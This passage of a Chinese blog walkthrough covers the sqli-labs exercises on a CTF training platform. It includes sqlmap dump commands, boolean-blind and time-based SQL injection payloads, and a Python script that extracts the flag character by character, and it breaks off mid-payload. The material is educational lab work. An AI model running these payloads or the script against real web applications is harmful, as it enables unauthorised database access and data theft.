src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732112398763-f110802b-de7b-42c6-9003-5bdeab80dbd8.png" referrerpolicy="no-referrer"></p><p><strong>爆表</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>fb38469f<span class="operator">-</span>e856<span class="number">-4765</span><span class="number">-99</span>c5<span class="operator">-</span>a785393f23ee.node5.buuoj.cn<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="operator">-</span>D ctftraining <span class="comment">--tables</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732112621785-51019acd-566a-4a2d-904a-ab3c3d88b840.png" referrerpolicy="no-referrer"></p><p><strong>爆字段</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>fb38469f<span class="operator">-</span>e856<span class="number">-4765</span><span class="number">-99</span>c5<span class="operator">-</span>a785393f23ee.node5.buuoj.cn<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="operator">-</span>D ctftraining <span class="operator">-</span>T flag <span class="comment">--columns</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732112688036-425f3ee2-72ed-4ac8-b2f8-5319c40d6573.png" referrerpolicy="no-referrer"></p><p><strong>爆数据</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>fb38469f<span class="operator">-</span>e856<span class="number">-4765</span><span class="number">-99</span>c5<span class="operator">-</span>a785393f23ee.node5.buuoj.cn<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="operator">-</span>D ctftraining <span class="operator">-</span>T flag <span class="operator">-</span>C flag <span class="operator">-</span>dump</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732112497811-d50e4ed5-b2c5-4d9a-b6c1-6dfe52385903.png" referrerpolicy="no-referrer"></p><p><strong>结果</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732112540130-8a2be891-6007-41c5-9bb9-eb3f8d19ca24.png" referrerpolicy="no-referrer"></p><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><h4 id="含义："><a href="#含义：" class="headerlink" title="含义："></a>含义：</h4><p><strong>布尔盲注的特点是，正确会有回显，错误没有回显。做题时，需要判断回显正确的条件是什么</strong></p><h4 id="重要函数"><a href="#重要函数" class="headerlink" title="重要函数"></a>重要函数</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 获取字符串str长度</span><br><span class="line">length(str)</span><br><span class="line"># 截取字符串,a是待截取的字符串，b是开始截取的位置（<span class="number">0</span>号位是<span class="number">1</span>），c是截取的长度</span><br><span class="line">substr(a,<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line"># 获取字符a的ascii码</span><br><span class="line">ascii(a)</span><br><span class="line"># 注意！！！</span><br><span class="line"># 在包含<span class="keyword">select</span>句子时，应该多加个括号</span><br></pre></td></tr></table></figure><h4 id="以-Less5-为例-已知单引号闭合"><a href="#以-Less5-为例-已知单引号闭合" class="headerlink" title="以 Less5 为例(已知单引号闭合)"></a>以 Less5 为例(已知单引号闭合)</h4><h5 id="不使用-sqlmap"><a href="#不使用-sqlmap" class="headerlink" title="不使用 sqlmap"></a>不使用 sqlmap</h5><h6 id="判断数据库长度"><a href="#判断数据库长度" class="headerlink" title="判断数据库长度"></a>判断数据库长度</h6><p><strong>先试试 50，正确</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length((select group_concat(schema_name) from information_schema.schemata))&gt;50--+</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732069082523-7f006779-3071-498e-a32e-b6ad887f2b74.png" referrerpolicy="no-referrer"></p><p><strong>再看看 70，不对</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length((select group_concat(schema_name) from information_schema.schemata))&gt;70--+</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732069166563-85d98fae-70e9-4a21-b0d1-b39741bf27a0.png" referrerpolicy="no-referrer"></p><p><strong>多试试，最后发现长度 69 是对的</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length((select group_concat(schema_name) from information_schema.schemata))&gt;69--+</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732069241455-061a4800-b03d-4140-8143-76fca65d1ec2.png" referrerpolicy="no-referrer"></p><h6 id="再判断判断具体字符"><a href="#再判断判断具体字符" class="headerlink" title="再判断判断具体字符"></a>再判断判断具体字符</h6><p><strong>这个字符的 ascii 码是大于 90 的</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select group_concat(schema_name) from information_schema.schemata),1,1))&gt;90--+</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732070032879-81b56711-4443-4b06-ac9f-2df331ffb462.png" referrerpolicy="no-referrer"></p><p><strong>再看看这个字符的 ascii 码是大于 100 的吗?不是</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select group_concat(schema_name) from information_schema.schemata),1,1))&gt;100--+</span></span><br></pre></td></tr></table></figure><p><strong>多次实验，得到第一个字符的 ascii 值为 99</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select group_concat(schema_name) from information_schema.schemata),1,1))=99--+</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">20</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732070327459-2f2a4967-5886-4c45-867b-686f5616a251.png" referrerpolicy="no-referrer"></p><p><strong>但是这样搞效率太慢了，试试 burp 爆破</strong></p><p><strong>先抓包，然后在这个地方添加位置</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732091256400-7297b7ee-c1e2-4909-aa9c-07fe71363694.png" referrerpolicy="no-referrer"></p><p><strong>然后添加 payload 格式</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732092145130-8f248477-7c85-44c7-b151-bb24f5131415.png" referrerpolicy="no-referrer"></p><p><strong>可以再加个内容匹配或者不加</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732091412706-cee6376e-5dba-4e2c-adde-ff8c5110ddea.png" referrerpolicy="no-referrer"></p><p><strong>最后结果，第一个字符 ascii 码值为 99</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732091459921-fc74eebe-bd24-40bd-9ef8-ebc7c5d312d0.png" referrerpolicy="no-referrer"></p><p><strong>之后再尝试其他位置，这样也好麻烦，而且最后还要转换为字符。</strong></p><p><strong>或者用脚本，也有点慢，5，6 分钟（还是推荐字符串长度用手注，具体内容再用脚本）</strong></p><p><strong>现在拿到了具体内容，如下。（脚本会在这题末尾粘出来）</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732074714652-9b1e984e-78e1-41a7-9ba6-f40d07113889.png" referrerpolicy="no-referrer"></p><h6 id="判断需要的数据库的所有表的长度"><a href="#判断需要的数据库的所有表的长度" class="headerlink" title="判断需要的数据库的所有表的长度"></a>判断需要的数据库的所有表的长度</h6><p><strong>手注格式</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length((select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctftraining&quot;))=14--+</span></span><br></pre></td></tr></table></figure><p>脚本遍历一下，共 15 个字符</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732092510928-87784244-42f2-44ea-bd07-0e84e9f6b844.png" referrerpolicy="no-referrer"></p><h6 id="再判断判断所有表具体字符"><a href="#再判断判断所有表具体字符" class="headerlink" title="再判断判断所有表具体字符"></a>再判断判断所有表具体字符</h6><p><strong>手注格式如下</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctftraining&quot;),15,1))=113--+</span></span><br></pre></td></tr></table></figure><p><strong>脚本爆破</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732092353398-528f5666-edd1-4148-bf8b-5393aeadf44b.png" referrerpolicy="no-referrer"></p><h6 id="判断需要的所有表中所有字段的长度"><a href="#判断需要的所有表中所有字段的长度" class="headerlink" title="判断需要的所有表中所有字段的长度"></a>判断需要的所有表中所有字段的长度</h6><p><strong>手注格式</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length((select group_concat(column_name) from information_schema.columns where table_name=&quot;flag&quot;))=4--+</span></span><br></pre></td></tr></table></figure><p><strong>遍历结果</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732092872807-a999926b-02eb-48dc-b583-bc59ad4439c0.png" referrerpolicy="no-referrer"></p><h6 id="再判断判断所有字段具体字符"><a href="#再判断判断所有字段具体字符" class="headerlink" title="再判断判断所有字段具体字符"></a>再判断判断所有字段具体字符</h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;flag&quot;),1,1))=102--+</span></span><br></pre></td></tr></table></figure><p><strong>字段名是 flag</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732093126509-ba02354c-c561-4e58-aaa4-b05266b0a720.png" referrerpolicy="no-referrer"></p><h6 id="判断需要的该字段下所有内容的长度"><a href="#判断需要的该字段下所有内容的长度" class="headerlink" title="判断需要的该字段下所有内容的长度"></a>判断需要的该字段下所有内容的长度</h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length((select group_concat(flag) from &quot;ctftraining.flag&quot;))=148--+</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732093796889-79a838c6-225b-45df-9418-ac90d372c3da.png" referrerpolicy="no-referrer"></p><h6 id="再判断判断所有内容具体字符"><a href="#再判断判断所有内容具体字符" class="headerlink" title="再判断判断所有内容具体字符"></a>再判断判断所有内容具体字符</h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select group_concat(flag) from ctftraining.flag),42,1))=125--+</span></span><br></pre></td></tr></table></figure><p>结束</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732094370628-500466f8-f997-4b84-8433-c1e6119926e9.png" referrerpolicy="no-referrer"></p><h6 id="脚本代码"><a href="#脚本代码" class="headerlink" title="脚本代码"></a>脚本代码</h6><p><strong>（自己写的，水平有限，不够简洁，效率一般）</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url <span class="operator">=</span> <span class="string">&#x27;http://723a482f-9b9c-4575-9450-a15ea380958e.node5.buuoj.cn/Less-5/&#x27;</span></span><br><span class="line">sqli_length<span class="operator">=</span>&#123;</span><br><span class="line">    <span class="string">&#x27;sqli_db&#x27;</span>:<span class="string">&#x27;length((select group_concat(schema_name) from information_schema.schemata))&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sqli_table&#x27;</span>:<span class="string">&#x27;length((select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctftraining&quot;))&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sqli_column&#x27;</span>:<span class="string">&#x27;length((select group_concat(column_name) from information_schema.columns where table_name=&quot;flag&quot;))&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sqli_flag&#x27;</span>:<span class="string">&#x27;length((select group_concat(flag) from ctftraining.flag))&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">sqli_str<span class="operator">=</span>&#123;</span><br><span class="line">    <span class="string">&#x27;sqli_db&#x27;</span>:<span class="string">&#x27;substr((select group_concat(schema_name) from information_schema.schemata)&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sqli_table&#x27;</span>:<span class="string">&#x27;substr((select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctftraining&quot;)&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sqli_column&#x27;</span>:<span class="string">&#x27;substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;flag&quot;)&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sqli_flag&#x27;</span>:<span class="string">&#x27;substr((select group_concat(flag) from ctftraining.flag)&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def check_db_length():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        url_db <span class="operator">=</span>url<span class="operator">+</span>&quot;?id=1&#x27; and &quot;<span class="operator">+</span>sqli_length[<span class="string">&#x27;sqli_db&#x27;</span>]<span class="operator">+</span>f&quot;=&#123;i&#125;--+&quot;</span><br><span class="line">        resp <span class="operator">=</span> requests.get(url_db)</span><br><span class="line">        if <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line">def check_db_str():</span><br><span class="line">    answer<span class="operator">=</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">1</span>,check_db_length()<span class="operator">+</span><span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">1</span>,<span class="number">128</span>):</span><br><span class="line">            url_db <span class="operator">=</span>url<span class="operator">+</span>&quot;?id=1&#x27; and &quot;<span class="operator">+</span>&quot;ascii(&quot;<span class="operator">+</span>sqli_str[<span class="string">&#x27;sqli_db&#x27;</span>]<span class="operator">+</span>f&quot;,&#123;i&#125;,1))=&#123;j&#125;--+&quot;</span><br><span class="line">            resp <span class="operator">=</span> requests.get(url_db)</span><br><span class="line">            if <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">                answer <span class="operator">+</span><span class="operator">=</span> chr(j)</span><br><span class="line">                print(chr(j))</span><br><span class="line">                break</span><br><span class="line">        print(f<span class="string">&#x27;&#123;i&#125;号位结束&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> answer</span><br><span class="line"></span><br><span class="line">def check_table_length():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        url_table <span class="operator">=</span>url<span class="operator">+</span>&quot;?id=1&#x27; and &quot;<span class="operator">+</span>sqli_length[<span class="string">&#x27;sqli_table&#x27;</span>]<span class="operator">+</span>f&quot;=&#123;i&#125;--+&quot;</span><br><span class="line">        print(url_table)</span><br><span class="line">        resp <span class="operator">=</span> requests.get(url_table)</span><br><span class="line">        if <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line">def check_table_str():</span><br><span class="line">    answer <span class="operator">=</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">1</span>, check_table_length() <span class="operator">+</span> <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">1</span>, <span class="number">128</span>):</span><br><span class="line">            url_table <span class="operator">=</span> url <span class="operator">+</span> &quot;?id=1&#x27; and &quot; <span class="operator">+</span> &quot;ascii(&quot; <span class="operator">+</span> sqli_str[<span class="string">&#x27;sqli_table&#x27;</span>] <span class="operator">+</span> f&quot;,&#123;i&#125;,1))=&#123;j&#125;--+&quot;</span><br><span class="line">            print(url_table)</span><br><span class="line">            resp <span class="operator">=</span> requests.get(url_table)</span><br><span class="line">            if <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">                answer <span class="operator">+</span><span class="operator">=</span> chr(j)</span><br><span class="line">                print(chr(j))</span><br><span class="line">                break</span><br><span class="line">        print(f<span class="string">&#x27;&#123;i&#125;号位结束&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> answer</span><br><span class="line"></span><br><span class="line">def check_column_length():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        url_column <span class="operator">=</span>url<span class="operator">+</span>&quot;?id=1&#x27; and &quot;<span class="operator">+</span>sqli_length[<span class="string">&#x27;sqli_column&#x27;</span>]<span class="operator">+</span>f&quot;=&#123;i&#125;--+&quot;</span><br><span class="line">        print(url_column)</span><br><span class="line">        resp <span class="operator">=</span> requests.get(url_column)</span><br><span class="line">        if <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line">def check_column_str():</span><br><span class="line">    answer <span class="operator">=</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">1</span>, check_column_length() <span class="operator">+</span> <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">1</span>, <span class="number">128</span>):</span><br><span class="line">            url_column <span class="operator">=</span> url <span class="operator">+</span> &quot;?id=1&#x27; and &quot; <span class="operator">+</span> &quot;ascii(&quot; <span class="operator">+</span> sqli_str[<span class="string">&#x27;sqli_column&#x27;</span>] <span class="operator">+</span> f&quot;,&#123;i&#125;,1))=&#123;j&#125;--+&quot;</span><br><span class="line">            print(url_column)</span><br><span class="line">            resp <span class="operator">=</span> requests.get(url_column)</span><br><span class="line">            if <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">                answer <span class="operator">+</span><span class="operator">=</span> chr(j)</span><br><span class="line">                print(chr(j))</span><br><span class="line">                break</span><br><span class="line">        print(f<span class="string">&#x27;&#123;i&#125;号位结束&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> answer</span><br><span class="line"></span><br><span class="line">def check_flag_length():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">        url_flag <span class="operator">=</span>url<span class="operator">+</span>&quot;?id=1&#x27; and &quot;<span class="operator">+</span>sqli_length[<span class="string">&#x27;sqli_flag&#x27;</span>]<span class="operator">+</span>f&quot;=&#123;i&#125;--+&quot;</span><br><span class="line">        print(url_flag)</span><br><span class="line">        resp <span class="operator">=</span> requests.get(url_flag)</span><br><span class="line">        if <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line">def check_flag_str():</span><br><span class="line">    answer <span class="operator">=</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">1</span>, check_flag_length() <span class="operator">+</span> <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">1</span>, <span class="number">128</span>):</span><br><span class="line">            url_flag <span class="operator">=</span> url <span class="operator">+</span> &quot;?id=1&#x27; and &quot; <span class="operator">+</span> &quot;ascii(&quot; <span class="operator">+</span> sqli_str[<span class="string">&#x27;sqli_flag&#x27;</span>] <span class="operator">+</span> f&quot;,&#123;i&#125;,1))=&#123;j&#125;--+&quot;</span><br><span class="line">            print(url_flag)</span><br><span class="line">            resp <span class="operator">=</span> requests.get(url_flag)</span><br><span class="line">            if <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">                answer <span class="operator">+</span><span class="operator">=</span> chr(j)</span><br><span class="line">                print(chr(j))</span><br><span class="line">                break</span><br><span class="line">        print(f<span class="string">&#x27;&#123;i&#125;号位结束&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> answer</span><br><span class="line"></span><br><span class="line">print(check_flag_str())</span><br></pre></td></tr></table></figure><h5 id="使用-sqlmap"><a href="#使用-sqlmap" class="headerlink" title="使用 sqlmap"></a>使用 sqlmap</h5><p><strong>爆库</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>fb38469f<span class="operator">-</span>e856<span class="number">-4765</span><span class="number">-99</span>c5<span class="operator">-</span>a785393f23ee.node5.buuoj.cn<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--technique B -dbs</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732113307128-40644e42-e33c-440f-a4bb-11b0e53a7bba.png" referrerpolicy="no-referrer"></p><p><strong>爆表</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>fb38469f<span class="operator">-</span>e856<span class="number">-4765</span><span class="number">-99</span>c5<span class="operator">-</span>a785393f23ee.node5.buuoj.cn<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--technique B -D ctftraining --tables</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732113549906-af7d6fb8-7d32-4e74-b309-2da7415da9ec.png" referrerpolicy="no-referrer"></p><p><strong>爆列</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>fb38469f<span class="operator">-</span>e856<span class="number">-4765</span><span class="number">-99</span>c5<span class="operator">-</span>a785393f23ee.node5.buuoj.cn<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--technique B -D ctftraining -T flag --columns</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732113600230-bd6553b7-0594-4703-ab87-22c7cadb1adb.png" referrerpolicy="no-referrer"></p><p><strong>爆数据</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>fb38469f<span class="operator">-</span>e856<span class="number">-4765</span><span class="number">-99</span>c5<span class="operator">-</span>a785393f23ee.node5.buuoj.cn<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--technique B -D ctftraining -T flag -C flag --dump</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732113669453-2f39638a-5af6-4668-8f20-8ece070d7668.png" referrerpolicy="no-referrer"></p><h3 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h3><p><strong>含义：</strong></p><p><strong>因为无论输入什么，结果都一样。在布尔盲注的基础上加上时间函数，以出现回显的时间是否延迟为判断条件</strong></p><h4 id="重要函数-1"><a href="#重要函数-1" class="headerlink" title="重要函数"></a>重要函数</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># a是判断条件，正确就执行b，错误就执行c</span><br><span class="line">if(a,b,c)</span><br><span class="line"># 延时函数，a代表秒数</span><br><span class="line">sleep(a)</span><br></pre></td></tr></table></figure><h4 id="以-Less9-为例"><a href="#以-Less9-为例" class="headerlink" title="以 Less9 为例"></a>以 Less9 为例</h4><h5 id="手注（演示）"><a href="#手注（演示）" class="headerlink" title="手注（演示）"></a>手注（演示）</h5><p><strong>判断闭合类型</strong></p><p><strong>第一个延时了，第二个没延时。为单引号闭合</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(1=1,sleep(5),1)--+</span></span><br><span class="line"><span class="string">?id=1&quot; and if(1=1,sleep(5),1)--+</span></span><br></pre></td></tr></table></figure><p><strong>判断数据库长度</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span 